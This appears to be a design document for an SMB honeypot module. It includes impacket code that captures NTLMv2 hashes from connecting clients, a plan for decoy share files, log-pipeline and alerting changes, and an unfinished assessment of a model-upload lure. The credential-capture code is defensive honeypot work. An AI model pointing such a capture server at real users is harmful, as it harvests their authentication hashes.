#     offline without per-session storage (acceptable for honeypot use).
#   server.setLogFile(path)
#     impacket's own log. Set to /dev/null — we emit structured JSON instead.
#   smbServer.getConnectionData(connId, *keys)
#     Returns per-connection values stored by impacket:
#       "ClientIP"        — attacker IP string
#       "ClientPort"      — attacker port int
#       "ServerChallenge" — 8-byte challenge bytes we sent (set after CHALLENGE_MESSAGE)

STATIC_CHALLENGE = bytes.fromhex("0011223344556677")  # 8 bytes — document for hashcat operators
NTLMSSP_SIG      = b"NTLMSSP\x00"


class NeuroDatSMBServer(SimpleSMBServer):

    def _authenticateUser(self, connId, smbServer, recvPacket,
                          SMBCommand, recvSignal):
        """Intercept NTLM AUTHENTICATE_MESSAGE to capture NTLMv2 hash, then reject."""
        client_ip   = "unknown"
        client_port = 0
        try:
            client_ip, client_port = smbServer.getConnectionData(
                connId, "ClientIP", "ClientPort"
            )
        except Exception:
            pass

        try:
            security_blob = SMBCommand["SecurityBlob"]
            idx = security_blob.find(NTLMSSP_SIG)
            if idx >= 0:
                ntlm_blob = security_blob[idx:]
                # Message type 3 = AUTHENTICATE_MESSAGE
                if len(ntlm_blob) >= 12 and ntlm_blob[8:12] == b"\x03\x00\x00\x00":
                    # Retrieve the challenge we sent (stored by impacket after CHALLENGE_MESSAGE)
                    challenge_bytes = smbServer.getConnectionData(connId, "ServerChallenge")
                    ntlmv2_hash, username, domain = _extract_ntlmv2(
                        challenge_bytes or STATIC_CHALLENGE,
                        ntlm_blob,
                    )
                    session_id = hashlib.sha256(
                        f"{client_ip}445{username}".encode()
                    ).hexdigest()[:16]
                    event = {
                        "eventid":      "smb.ntlmv2.hash",
                        "src_ip":       str(client_ip),
                        "src_port":     int(client_port) if client_port else None,
                        "dst_port":     445,
                        "username":     username or None,
                        "password":     None,
                        "session":      session_id,
                        "ntlmv2_hash":  ntlmv2_hash,
                        "domain":       domain or None,
                        "sensor":       "smb",
                        "_sensor_type": "smb",
                        "_protocol":    "smb",
                    }
                    _write_event(event)
                    log.warning("ntlmv2_captured src_ip=%s user=%s", client_ip, username)

                    # Also emit smb.auth.attempt so the connect→auth flow is visible
                    _write_event({
                        "eventid":      "smb.auth.attempt",
                        "src_ip":       str(client_ip),
                        "src_port":     int(client_port) if client_port else None,
                        "dst_port":     445,
                        "username":     username or None,
                        "password":     None,
                        "session":      session_id,
                        "sensor":       "smb",
                        "_sensor_type": "smb",
                        "_protocol":    "smb",
                    })
        except Exception as exc:
            log.debug("auth_intercept_error: %s", exc)

        # Always call super() — it rejects the auth since no password is configured.
        # This is the correct posture: we capture the hash but grant no session.
        return super()._authenticateUser(connId, smbServer, recvPacket,
                                         SMBCommand, recvSignal)


# ---------------------------------------------------------------------------
# Server factory
# ---------------------------------------------------------------------------
def _build_server() -> NeuroDatSMBServer:
    """
    Construct and configure the impacket SMB server.

    SimpleSMBServer constructor (impacket 0.12.0):
      SimpleSMBServer(listenAddress: str, listenPort: int)

    Key method signatures:
      server.addShare(shareName: str, sharePath: str, shareComment: str, readOnly: bool)
      server.setSMBChallenge(challenge: bytes)   — must be exactly 8 bytes
      server.setLogFile(path: str)
      server.start()                             — blocking; runs its own select() loop
    """
    server = NeuroDatSMBServer(LISTEN_IP, LISTEN_PORT)
    server.setSMBChallenge(STATIC_CHALLENGE)
    server.setLogFile("/dev/null")    # suppress impacket's own log; we write JSON

    # Register the lure share.
    # Share name must be UPPER per SMB convention (case-insensitive, but uppercase
    # is what Windows servers return — lowercase would be a tell).
    # readOnly=True: SMB2_WRITE returns STATUS_ACCESS_DENIED without disconnecting.
    # IPC$ is added automatically by impacket — required for named pipe connections.
    server.addShare(
        SHARE_NAME.upper(),
        SHARE_PATH,
        f"Neuro ML dataset storage — {DOMAIN}",
        readOnly=True,
    )
    return server


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    Path(SMB_LOG).parent.mkdir(parents=True, exist_ok=True)
    log.warning("smb_lure_starting share=%s server=%s ip=%s port=%d",
                SHARE_NAME, SERVER_NAME, LISTEN_IP, LISTEN_PORT)

    _write_event({
        "eventid":    "smb.server.started",
        "src_ip":     "0.0.0.0",
        "src_port":   None,
        "dst_port":   445,
        "username":   None,
        "password":   None,
        "session":    "startup",
        "share":      SHARE_NAME,
        "server":     SERVER_NAME,
        "domain":     DOMAIN,
        "sensor":     "smb",
        "_sensor_type": "smb",
        "_protocol":    "smb",
    })

    def _shutdown(sig, frame):
        log.warning("smb_lure_stopping signal=%d", sig)
        sys.exit(0)

    signal.signal(signal.SIGTERM, _shutdown)
    signal.signal(signal.SIGINT, _shutdown)

    server = _build_server()
    server.start()    # blocking


if __name__ == "__main__":
    main()
```

**Critical impacket API notes**:

- `SimpleSMBServer(listenAddress, listenPort)` — constructor takes an IP string and an int port.
- `server.addShare(name, path, comment, readOnly)` — `readOnly=True` sends `STATUS_ACCESS_DENIED` on write attempts without disconnecting the session, so the attacker can continue browsing.
- `server.setSMBChallenge(bytes)` — must be exactly 8 bytes. The static value `0011223344556677` must be documented for operators so they can use it in hashcat mask attacks.
- `server.setLogFile(path)` — set to `/dev/null` to suppress impacket's own log; we emit structured JSON instead.
- `server.start()` — blocking call; starts the `select()`-based event loop.
- `smbServer.getConnectionData(connId, *keys)` — retrieves per-connection state stored by impacket. `"ClientIP"` and `"ClientPort"` are set on accept. `"ServerChallenge"` is set when the CHALLENGE_MESSAGE is sent.
- `ntlm.NTLMAuthChallengeResponse(blob)` — parses an AUTHENTICATE_MESSAGE byte string. Fields accessible via `.get()`: `user_name` (bytes, UTF-16LE), `domain_name` (bytes, UTF-16LE), `NTChallengeResponse` (bytes; first 16 = NTProofStr, remainder = client blob for Hashcat).

**NTLM capture coverage matrix**:

| Tool | Protocol | Captures | Notes |
|------|----------|----------|-------|
| `smbclient -L //host -U user%pass` | SMB2 | `smb.ntlmv2.hash` | Standard Linux SMB client |
| `crackmapexec smb host -u user -p pass` | SMB2 | `smb.ntlmv2.hash` | Most common pentest tool |
| Windows Explorer `\\host\share` | SMB2 | `smb.ntlmv2.hash` | Windows auto-sends current user NTLM |
| `nmap --script smb-enum-shares` | SMB2 | `smb.enum.shares`, `smb.connect` | Also probes IPC$ |
| `rpcclient -U user host` | SMB2 + DCERPC | `smb.ntlmv2.hash`, `smb.pipe.connect` | Pipe = IPC$ + DCERPC |
| `enum4linux host` | SMB + RPC | `smb.auth.attempt`, `smb.pipe.connect` | Runs multiple RPC calls |

---

### 6. Log Format and Event Schema

`smb_server.py` writes newline-delimited JSON to `SMB_LOG` (`/var/log/smb/smb.json`). Each line is a complete JSON object. The `SmbTailer` class in `log_shipper.py` reads these lines and maps them into `honeypot_events` INSERT rows.

**Event types and `honeypot_events` column mappings**:

| `eventid` | Trigger | `sensor` col | `event_type` col | `username` | `password` | Notable payload fields |
|-----------|---------|-------------|-----------------|-----------|-----------|----------------------|
| `smb.connect` | TCP accept before SMB handshake | `"smb"` | `"smb.connect"` | null | null | `src_port` |
| `smb.auth.attempt` | NTLM AUTHENTICATE_MESSAGE received (emitted alongside ntlmv2.hash) | `"smb"` | `"smb.auth.attempt"` | attacker username | null | — |
| `smb.ntlmv2.hash` | NTLM AUTHENTICATE_MESSAGE fully parsed | `"smb"` | `"smb.ntlmv2.hash"` | attacker username | null | `ntlmv2_hash` (Hashcat 5600 format), `domain` |
| `smb.enum.shares` | `NetShareEnum` RPC call received | `"smb"` | `"smb.enum.shares"` | username if authed | null | `shares_requested` |
| `smb.file.read` | `SMB2_READ` request on a file path | `"smb"` | `"smb.file.read"` | username | null | `path`, `file_name` |
| `smb.file.write` | `SMB2_WRITE` attempt (returns STATUS_ACCESS_DENIED) | `"smb"` | `"smb.file.write"` | username | null | `path`, `file_name` |
| `smb.pipe.connect` | IPC$ `\\PIPE\srvsvc` or `\\PIPE\samr` open | `"smb"` | `"smb.pipe.connect"` | username | null | `pipe_name` |
| `smb.server.started` | Startup sentinel — suppressed by log-shipper | `"smb"` | (suppressed) | null | null | `share`, `server`, `domain` |

**Raw JSON line example — NTLMv2 hash capture**:
```json
{
  "event_id": "d4f1a2b3-c9e8-4f71-a2b3-d4e5f6a7b8c9",
  "timestamp": "2026-06-05T14:23:17.412398Z",
  "eventid": "smb.ntlmv2.hash",
  "src_ip": "113.211.98.4",
  "src_port": 49182,
  "dst_port": 445,
  "username": "administrator",
  "password": null,
  "session": "a7f3c2d1e5b8f9a0",
  "ntlmv2_hash": "administrator::NEURO:0011223344556677:a1b2c3d4e5f6a7b8:0101000000000000...",
  "domain": "NEURO",
  "sensor": "smb",
  "_sensor_type": "smb",
  "_protocol": "smb"
}
```

**PostgreSQL INSERT fields populated per event type**:

```
event_id:         str(uuid.uuid4())  — generated by SmbTailer._process()
created_at:       event["timestamp"]
sensor:           "smb"
event_type:       event["eventid"]
src_ip:           event["src_ip"]
src_port:         event["src_port"]
dst_port:         445
geo_*:            enrich_geoip(src_ip)  — same GeoIP enrichment as other sensors
username:         event["username"]
password:         null  — NTLMv2 hash goes in payload, not password column
payload:          {"ntlmv2_hash": "...", "domain": "...", "pipe_name": "...", ...}
raw_log:          full event dict as JSON
session_id:       event["session"]
threat_score:     80 for smb.ntlmv2.hash, 65 for smb.file.write/smb.pipe.connect, 35 for smb.connect/smb.enum.shares/smb.auth.attempt
tags:             ["credential-theft","smb-probe"] for ntlmv2.hash; ["lateral-movement","smb-probe"] for file.write; ["smb-probe"] for others
is_tor:           _is_tor(src_ip)
```

**Why `password` stays null for NTLMv2 hashes**: The `password` column in `honeypot_events` holds cleartext strings. The NTLMv2 hash is a challenge/response proof — not the cleartext password. Storing it in `password` would pollute credential replay correlation queries (which compare cleartext passwords across sensors). The hash goes in `payload->ntlmv2_hash` where sentinel displays it in the alert body.

---

### 7. DNAT Rule — Changes to `deploy/systemd/honeypot-dnat.sh`

Replace the existing SMB revert comment block:
```bash
# Port 445 (SMB): REVERTED — OpenCanary SMB module requires a running Samba/smbd
# with full_audit VFS; no samba in the Dockerfile; dark 445 is a fingerprint tell.
# Do not re-enable without: samba in Dockerfile, smb.conf full_audit, bind 445 in
# compose, and a verified smbclient -L event landing in opencanary.json.
```

With:
```bash
# Module 9: smb-lure (impacket pure-Python SMB, no Samba required, container 10.10.20.10:445)
rule "dport 445 dnat to 10.10.20.10:445"   tcp dport 445  dnat to 10.10.20.10:445

# smb-lure FORWARD rule — DOCKER-USER so it survives co-tenant docker compose down/up.
# Docker never flushes DOCKER-USER; it only rewrites DOCKER and FORWARD chains.
if ! iptables -C DOCKER-USER -d 10.10.20.10/32 -p tcp --dport 445 -j ACCEPT 2>/dev/null; then
    iptables -I DOCKER-USER 1 -d 10.10.20.10/32 -p tcp --dport 445 -j ACCEPT
    echo "honeypot-dnat: added DOCKER-USER ACCEPT for smb-lure 10.10.20.10:445"
else
    echo "honeypot-dnat: DOCKER-USER rule for smb-lure already present"
fi
```

Also update the header comment block listing container IPs:
```bash
#   10.10.20.10 smb-lure      (SMB/NTLM lure — impacket, no Samba required)
```

**After editing**, apply and verify:
```bash
sudo systemctl daemon-reload && sudo systemctl restart honeypot-dnat.service

# Verify DNAT rule exists:
sudo nft list chain ip honeypot-dnat prerouting | grep 445
# Expected: iif "eth0" tcp dport 445 dnat to 10.10.20.10:445

# Verify counter increments after a test TCP connect:
python3 -c "import socket; s=socket.socket(); s.settimeout(2); s.connect(('10.10.20.10',445)); s.close()"
sudo nft list chain ip honeypot-dnat prerouting | grep 445
# Counter packets value should have incremented
```

**Also open port 445 at the Contabo provider firewall** (same web panel where port 22 was opened during Module 2 deployment). Without this, the DNAT rules are irrelevant — the provider drops port 445 SYN packets before they reach the VPS NIC.

---

### 8. log-shipper Integration (`log_shipper.py`)

Eight targeted changes. No existing logic is deleted or restructured.

**Change 1 — Add `SMB_LOG` env var** (near top of file, with other log path vars):
```python
SMB_LOG = os.environ.get("SMB_LOG", "/var/log/smb/smb.json")
```

**Change 2 — Add `SmbTailer` and `SmbFileEventHandler` classes** (insert after `MariaDBFileEventHandler`, before `PostgresWriter`):

```python
# ---------------------------------------------------------------------------
# SMB JSON log tailer (Module 9 — smb-lure)
# ---------------------------------------------------------------------------
# smb_server.py writes one JSON object per line to smb.json.
# Each line: eventid, src_ip, src_port, dst_port, username, session,
#            timestamp, ntlmv2_hash (for smb.ntlmv2.hash), sensor, _sensor_type.
# ---------------------------------------------------------------------------

class SmbTailer:
    """Tails /var/log/smb/smb.json, parses each JSON line, enqueues normalized events."""

    def __init__(self, log_path: str):
        self.log_path = log_path
        self._fh      = None
        self._inode   = None
        self._partial = ""

    def _open(self) -> bool:
        try:
            self._fh    = open(self.log_path, "r", encoding="utf-8", errors="replace")
            stat        = os.stat(self.log_path)
            self._inode = stat.st_ino
            self._fh.seek(0, 2)
            self._partial = ""
            log.info("smb_tailer_opened", path=self.log_path)
            return True
        except FileNotFoundError:
            log.warning("smb_log_not_found", path=self.log_path,
                        hint="smb-lure container may not have started yet; will retry")
            return False
        except Exception as exc:
            log.error("smb_open_error", path=self.log_path, error=str(exc))
            return False

    def _check_rotation(self) -> None:
        if self._fh is None:
            return
        try:
            stat = os.stat(self.log_path)
            if stat.st_ino != self._inode:
                log.info("smb_log_rotated", path=self.log_path)
                self._fh.close()
                self._fh = None
                self._open()
        except FileNotFoundError:
            self._fh.close()
            self._fh = None

    def read_new_lines(self) -> None:
        if self._fh is None:
            if not self._open():
                return
        self._check_rotation()
        if self._fh is None:
            return
        while True:
            chunk = self._fh.readline()
            if not chunk:
                break
            if not chunk.endswith("\n"):
                self._partial += chunk
                break
            line = (self._partial + chunk).strip()
            self._partial = ""
            if not line:
                continue
            try:
                raw = json.loads(line)
            except json.JSONDecodeError as exc:
                log.warning("smb_json_parse_error", line=line[:200], error=str(exc))
                continue
            if not isinstance(raw, dict):
                continue
            self._process(raw)

    def _process(self, raw: dict) -> None:
        """Normalize a smb_server.py JSON event and enqueue it."""
        eventid = raw.get("eventid", "")
        if eventid == "smb.server.started":
            return    # startup sentinel — not an attacker event

        src_ip   = raw.get("src_ip", "")
        src_port = raw.get("src_port")
        geo      = enrich_geoip(src_ip)

        # Build payload dict — ntlmv2_hash is the highest-value field
        payload_fields = {}
        for key in ("ntlmv2_hash", "domain", "pipe_name", "path",
                    "file_name", "shares_requested", "ntlm_flags"):
            v = raw.get(key)
            if v is not None:
                payload_fields[key] = v

        event = {
            "eventid":      eventid,
            "src_ip":       src_ip,
            "src_port":     int(src_port) if src_port is not None else None,
            "session":      raw.get("session", ""),
            "timestamp":    raw.get("timestamp", _now_iso()),
            "sensor":       "smb",
            "dst_port":     raw.get("dst_port", 445),
            "username":     raw.get("username"),
            "password":     None,    # NTLM hash never goes in password column
            "_sensor_type": "smb",
            "_protocol":    "smb",
            "_raw":         raw,
            **payload_fields,        # ntlmv2_hash etc available to PostgresWriter.write()
            **geo,
        }
        _enqueue(event)


class SmbFileEventHandler(FileSystemEventHandler):
    def __init__(self, tailer: SmbTailer):
        self._tailer = tailer

    def on_modified(self, event):
        if not event.is_directory and event.src_path == self._tailer.log_path:
            self._tailer.read_new_lines()

    def on_moved(self, event):
        if not event.is_directory and (
            event.src_path == self._tailer.log_path or
            event.dest_path == self._tailer.log_path
        ):
            self._tailer.read_new_lines()
```

**Change 3 — `PostgresWriter.write()` sensor_col map** (add `"smb"` entry):
```python
sensor_col = {
    "ssh":        "cowrie",
    "opencanary": "opencanary",
    "mariadb":    "mariadb",
    "api":        "api",
    "smb":        "smb",      # NEW
}.get(sensor_type, sensor_type)
```

**Change 4 — `_compute_threat_score()`** (add before the final `return 10`):
```python
if eventid == "smb.ntlmv2.hash":
    return 80    # credential capture — same tier as RCE attempt
if eventid in ("smb.file.write", "smb.pipe.connect"):
    return 65    # lateral movement indicators
if eventid in ("smb.enum.shares", "smb.auth.attempt", "smb.connect"):
    return 35    # recon — comparable to cowrie.login.failed
```

**Change 5 — `_compute_tags()`** (add before `return list(tags)`):
```python
if eventid == "smb.ntlmv2.hash":
    tags.update(["credential-theft", "smb-probe"])
if eventid == "smb.file.write":
    tags.update(["lateral-movement", "smb-probe"])
if eventid in ("smb.enum.shares", "smb.connect", "smb.auth.attempt", "smb.pipe.connect"):
    tags.add("smb-probe")
```

**Change 6 — `_classify_kill_chain_stage()`** (add within the function at the correct priority levels):
```python
# Insert after the CREDENTIAL_ACCESS block, before DISCOVERY:
if eventid == "smb.ntlmv2.hash":
    return "CREDENTIAL_ACCESS"
# Insert in the INITIAL_ACCESS block:
if eventid == "smb.auth.attempt":
    return "INITIAL_ACCESS"
# Insert in the RECON block:
if eventid in ("smb.connect", "smb.enum.shares", "smb.pipe.connect"):
    return "RECON"
```

**Change 7 — `_HD_SENSOR_NAME` map** (add `"smb"` entry):
```python
_HD_SENSOR_NAME = {
    SENSOR_NAME_COWRIE:     "remote",
    SENSOR_NAME_OPENCANARY: "remote",
    SENSOR_NAME_MARIADB:    "remote",
    SENSOR_NAME_API:        "remote",
    "smb":                  "remote",    # NEW
}
```

**Change 8 — Wire `SmbTailer` into the observer in `main()`** (add after the MariaDB observer block):
```python
smb_log_path = os.environ.get("SMB_LOG", "/var/log/smb/smb.json")
smb_tailer   = SmbTailer(smb_log_path)
smb_handler  = SmbFileEventHandler(smb_tailer)
observer.schedule(smb_handler, path=str(Path(smb_log_path).parent), recursive=False)
log.info("smb_tailer_scheduled", path=smb_log_path)
```

**log-shipper docker-compose.yml changes** (`deploy/module-5-log-shipper/docker-compose.yml`):

```yaml
# Add to volumes section (top-level):
  smb-logs:
    external: true
    name: smb-logs

# Add to log-shipper service volumes list:
      - smb-logs:/var/log/smb:ro

# Add to log-shipper service environment:
      - SMB_LOG=/var/log/smb/smb.json
```

**Rebuild both log-shipper and sentinel** (they share the same image):
```bash
cd /opt/honeypot/deploy/module-5-log-shipper/
docker compose build --no-cache log-shipper sentinel
docker compose up -d log-shipper
docker compose build --no-cache sentinel && docker compose up -d sentinel
```

---

### 9. Sentinel Integration (`sentinel.py`)

Five targeted additions.

**Addition 1 — `_NO_COOLDOWN_EVENTS`**:
```python
_NO_COOLDOWN_EVENTS = {
    # ... existing entries ...
    "smb.ntlmv2.hash",       # NTLMv2 hash capture — always alert immediately, no suppression
}
```

**Addition 2 — `_NOISE_EVENTS`**:
```python
_NOISE_EVENTS = {
    # ... existing entries ...
    "smb.server.started",    # startup event from smb_server.py — not an attacker action
}
```

**Addition 3 — `_SNARE_CATEGORIES`** (inside `_should_alert()`):
```python
_SNARE_CATEGORIES = {
    # ... existing entries ...
    "smb.ntlmv2.hash":    "smb.hash",     # no-cooldown — see _NO_COOLDOWN_EVENTS
    "smb.auth.attempt":   "smb",          # collapses with smb.connect in one IP bucket
    "smb.connect":        "smb",
    "smb.enum.shares":    "smb.enum",     # separate bucket — distinct attack step
    "smb.pipe.connect":   "smb.pipe",     # RPC enumeration — distinct bucket
    "smb.file.read":      "smb.file",
    "smb.file.write":     "smb.file",     # collapses with smb.file.read
}
```

**Addition 4 — `_build_reason()`** (add before the final `return event_type` fallback):
```python
if event_type == "smb.ntlmv2.hash":
    nt_hash  = payload.get("ntlmv2_hash") or ""
    domain   = payload.get("domain") or ""
    user_str = f"{domain}\\{username}" if domain else username
    hash_pre = nt_hash[:60] + "..." if len(nt_hash) > 60 else nt_hash
    return f"NTLMv2 hash captured — {user_str} — {hash_pre}"
if event_type == "smb.enum.shares":
    return f"SMB share enumeration — user={username or '(anonymous)'}"
if event_type == "smb.auth.attempt":
    return f"SMB auth attempt — user={username or '(anonymous)'}"
if event_type == "smb.pipe.connect":
    pipe = payload.get("pipe_name") or "(unknown)"
    return f"SMB named pipe opened — {pipe} (RPC enumeration)"
if event_type == "smb.file.read":
    fpath = payload.get("path") or payload.get("file_name") or "(unknown)"
    return f"SMB file read attempt — {fpath}"
if event_type == "smb.file.write":
    fpath = payload.get("path") or payload.get("file_name") or "(unknown)"
    return f"SMB file WRITE attempt — {fpath} (returned ACCESS_DENIED)"
if event_type.startswith("smb."):
    return f"SMB probe: {event_type}"
```

**Addition 5 — `_build_message()` Telegram header** (add before the final `else: header = "🚨 <b>Honeypot Alert</b>"`):
```python
elif event_type == "smb.ntlmv2.hash":
    header = "🪟📁 <b>SMB HASH CAPTURED — NTLMv2</b>"
elif event_type == "smb.file.write":
    header = "🪟📁 <b>SMB WRITE ATTEMPT</b>"
elif event_type in ("smb.enum.shares", "smb.pipe.connect"):
    header = "🪟📁 <b>SMB SHARE PROBE</b>"
elif event_type.startswith("smb."):
    header = "🪟📁 <b>SMB SHARE PROBE</b>"
```

No changes are needed to `_check_credential_replay()` — NTLMv2 hashes are stored in `payload` not `password`, so they are correctly excluded from password-based cross-sensor correlation. No changes are needed to `_check_multisensor_kill_chain()` — it queries `COUNT(DISTINCT sensor) >= 3`, which already counts `smb` as a distinct sensor once the `sensor` column is populated.

---

### 10. Cover Story

**Share name**: `neuro-data-share`

Presented in SMB responses as:
```
\\NEURO-TRAIN-01\neuro-data-share  —  "Neuro ML dataset storage — NEURO"
```

This is plausible because ML training jobs commonly mount CIFS dataset shares to avoid large file copies per job. The server name `NEURO-TRAIN-01` exactly matches the hostname visible in the HTTP API (`/api/v1/cluster/nodes`) and in the Cowrie honeyfs (`/etc/hostname`). An attacker enumerating the platform can follow this path: HTTP cluster API lists node IP → SSH to Cowrie at that IP → sees `neuro-train-01` in the shell → tries `\\neuro-train-01\neuro-data-share` for dataset access. All three surfaces reinforce each other.

**Lure files** to place in `/opt/honeypot/config/smb/` (bind-mounted into the container as the share root):

| Filename | Why it is enticing |
|----------|-------------------|
| `model-manifest-export.json` | Same file referenced by the HTTP `/api/v1/lure/model-manifest` route — cross-surface consistency |
| `workspace-export-2026-05-31.csv` | Same canary CSV that triggers `http.lure.data_exfil` on HTTP — if grabbed via SMB instead, the SMB event captures it |
| `training-config-prod.yaml` | Fake ML config with placeholder credentials — invites editing |
| `checkpoint-final-llama3-8b.bin` | 0-byte stub — appears in `dir` output; downloading returns 0 bytes (consistent with a pre-production share) |
| `README-datasets.txt` | Content: `"Neuro dataset mount — read-only for non-svc accounts. Contact priya.nair@neuro.ai to request write access."` Reinforces the read-only posture and leaks the persona name. |

**What NOT to expose on the share**: No `passwords.txt`, no `.env` files, no private keys (`id_rsa`, `id_ed25519`). These are immediately recognisable as planted lures. No executable files (`.exe`, `.sh`) before the attacker has done anything — that would look like attacker staging infrastructure, not a real ML dataset share.

---

### 11. Verification Checklist (`verify-module-9.sh`)

```bash
#!/bin/bash
# verify-module-9.sh — SMB lure (Module 9) verification
# Run from /opt/honeypot/deploy/module-9-smb-lure/ on the VPS.
# All 5 checks must pass before enabling DNAT.

set -euo pipefail
PASS=0; FAIL=0

ok()   { echo "[PASS] $1"; ((PASS++)) || true; }
fail() { echo "[FAIL] $1"; ((FAIL++)) || true; }

# Check 1: Container is running and healthy
echo "=== Check 1: Container health ==="
STATUS=$(docker inspect --format '{{.State.Status}}' smb-lure 2>/dev/null || echo "missing")
if [ "$STATUS" = "running" ]; then ok "smb-lure container running"
else fail "smb-lure container not running (status: $STATUS)"; fi

# Check 2: Port 445 accepts TCP connections on container IP
echo "=== Check 2: Port 445 TCP connect ==="
if python3 -c "
import socket, sys
s = socket.socket()
s.settimeout(3)
try:
    s.connect(('10.10.20.10', 445))
    s.close()
    sys.exit(0)
except Exception as e:
    print(f'  error: {e}')
    sys.exit(1)
"; then ok "Port 445 TCP connect succeeded (10.10.20.10:445)"
else fail "Port 445 not responding on 10.10.20.10"; fi

# Check 3: Share visible via smbclient
echo "=== Check 3: Share visible via smbclient ==="
if command -v smbclient &>/dev/null; then
    if smbclient -L "//10.10.20.10" -N 2>/dev/null | grep -qi "neuro-data-share"; then
        ok "neuro-data-share visible in share listing"
    else
        fail "neuro-data-share not found in smbclient -L output"
    fi
else
    echo "  [SKIP] smbclient not installed — install with: apt-get install -y smbclient"
    echo "  Manual check: smbclient -L //10.10.20.10 -N"
fi

# Check 4: smb.connect event written to log file
echo "=== Check 4: JSON log written by smb_server.py ==="
# Trigger a connect event
python3 -c "
import socket
s = socket.socket()
s.settimeout(3)
try: s.connect(('10.10.20.10', 445))
except: pass
finally: s.close()
" 2>/dev/null || true
sleep 2
LOG_FILE=$(docker inspect smb-lure --format '{{range .Mounts}}{{if eq .Destination "/var/log/smb"}}{{.Source}}{{end}}{{end}}')/smb.json
if [ -f "$LOG_FILE" ] && grep -q '"eventid"' "$LOG_FILE" 2>/dev/null; then
    EVENT_COUNT=$(grep -c '"eventid"' "$LOG_FILE" || echo 0)
    ok "smb.json has $EVENT_COUNT event(s)"
else
    fail "smb.json missing or empty — check SMB_LOG path in container"
fi

# Check 5: SMB event appears in PostgreSQL (confirms log-shipper tailing is active)
echo "=== Check 5: SMB event in PostgreSQL ==="
sleep 10    # allow log-shipper up to 10s to process the event from Check 4
PG_COUNT=$(docker exec postgres psql -U honeypot -d honeypot -t -c \
    "SELECT COUNT(*) FROM honeypot_events WHERE sensor='smb' AND created_at > NOW() - INTERVAL '3 minutes';" \
    2>/dev/null | tr -d '[:space:]' || echo "0")
if [ "${PG_COUNT:-0}" -gt 0 ]; then
    ok "PostgreSQL has $PG_COUNT SMB event(s) from last 3 minutes"
else
    fail "No SMB events in PostgreSQL — verify log-shipper mounts smb-logs volume and SMB_LOG env var is set"
fi

echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="
if [ "$FAIL" -eq 0 ]; then echo "Module 9 VERIFIED"
else echo "Module 9 NEEDS ATTENTION"; exit 1; fi
```

**Manual NTLMv2 hash test** (run from any external machine with smbclient, after DNAT is live):
```bash
# Triggers full NTLM auth exchange — captures hash regardless of whether login succeeds
smbclient //158.220.110.47/neuro-data-share -U "testuser%testpassword"

# On VPS — verify hash was captured in PostgreSQL:
docker exec postgres psql -U honeypot -d honeypot \
  -c "SELECT src_ip::text, username, payload->>'ntlmv2_hash' AS hash
      FROM honeypot_events
      WHERE event_type='smb.ntlmv2.hash'
      ORDER BY created_at DESC LIMIT 3;"

# Expected output: row where hash column starts with:
# testuser::NEURO:0011223344556677:...
```

---

### 12. Effort Estimate and Deployment Order

**Effort**: 4–5 hours total.

| Task | Effort |
|------|--------|
| `smb_server.py` — impacket API wiring + NTLMv2 extraction | 2h |
| Dockerfile + docker-compose.yml + .env.example | 30 min |
| `log_shipper.py` — `SmbTailer` + sensor_col + threat_score + tags + kill chain + volume wiring | 1h |
| `sentinel.py` — headers + reasons + categories + no-cooldown | 30 min |
| `honeypot-dnat.sh` update + provider firewall + verify checklist run | 30 min |

**Deployment order** (sequential — each step depends on the previous):

1. Build the container: `docker compose up -d --build` then `docker inspect smb-lure` — Check 1 passes
2. Verify port 445 TCP connect on container IP: Check 2
3. Run `smbclient -L //10.10.20.10 -N` — Check 3: confirms impacket is completing SMB negotiation
4. Update `honeypot-dnat.sh` with the two new rules, then `sudo systemctl daemon-reload && sudo systemctl restart honeypot-dnat.service`
5. Open port 445 at Contabo provider firewall panel
6. Rebuild log-shipper + sentinel with `SmbTailer` changes
7. Update log-shipper `docker-compose.yml` to add `smb-logs` volume + env var, then `docker compose up -d log-shipper`
8. Run `verify-module-9.sh` — all 5 checks must pass
9. Run external NTLMv2 hash test from a machine outside the VPS

**Post-deployment monitoring**:
```bash
# Watch SMB events landing in PostgreSQL:
docker exec postgres psql -U honeypot -d honeypot \
  -c "SELECT event_type, src_ip::text, username, created_at FROM honeypot_events WHERE sensor='smb' ORDER BY created_at DESC LIMIT 10;"

# Watch log-shipper processing SMB log lines:
docker logs -f log-shipper 2>&1 | grep -E "smb|SmbTailer"

# Confirm DNAT counter is incrementing after external probes:
sudo nft list chain ip honeypot-dnat prerouting | grep "dport 445"
```

**Kill-chain bridge value**: An attacker who discovers `\\NEURO-TRAIN-01\neuro-data-share` via the HTTP cluster API (`/api/v1/cluster/nodes`), submits credentials with `crackmapexec`, and has their NTLMv2 hash captured, represents the most complete cross-surface kill chain the platform can demonstrate: HTTP recon → SSH probe (Cowrie) → SMB credential capture. The `_check_multisensor_kill_chain()` query in sentinel fires automatically when the same `src_ip` appears across `api` + `cowrie` + `smb` sensors within 60 minutes, and the `smb.ntlmv2.hash` event maps to `CREDENTIAL_ACCESS` in the kill chain state machine — advancing the attacker session stage and triggering the stage-transition alert.

---

## Session 8 — Model Poisoning Upload (Pending Gatekeeper Review)

**Recommendation: DO NOT ADD as a separate endpoint. The existing `script-upload` covers the malware capture story completely. A dedicated model file upload endpoint adds marginal deception value that does not justify the duplication.**

### Assessment

**Does the existing `script-upload` endpoint cover the ML malware story?**

Yes, convincingly. The current `POST /api/v1/training/jobs/script-upload` endpoint is surfaced on `/jobs/new` as an init-script submission — a standard pattern in ML orchestration platforms (Weights & Biases, MLflow, Vertex AI all accept startup scripts for training runs). The response returns `"status": "queued"` and `"message": "Init script accepted. Job queued on neuro-train-01."` which is entirely consistent with the AI-training-platform cover story. An attacker planting a malicious init script (e.g., a reverse shell or a cryptominer wrapped in a bash payload) on a training cluster is itself a well-documented, realistic attack vector — not a contrived one. The file is captured to `UPLOAD_DIR`, the `http.upload.malware_received` event fires with no sentinel cooldown, and the payload metadata (filename, MIME type, size, source IP) is all recorded. The story is complete.

**Does a dedicated model poisoning endpoint add meaningful deception value?**

In principle, ML model supply chain poisoning is a real and high-profile threat: the Hugging Face pickling RCE vulnerabilities (2023), the ShadowRay campaign against Ray clusters (2024), and MITRE ATLAS ML-specific TTPs (AML.T0010 — ML Supply Chain Compromise) all confirm that uploading a malicious `.pkl` or `.pt` file to gain code execution on an inference server is a recognized attack path. A `POST /api/v1/models/upload` route positioned as "register your trained model for deployment" would be thematically coherent.

However, the deception value delta over the existing endpoint is near-zero for three reasons:

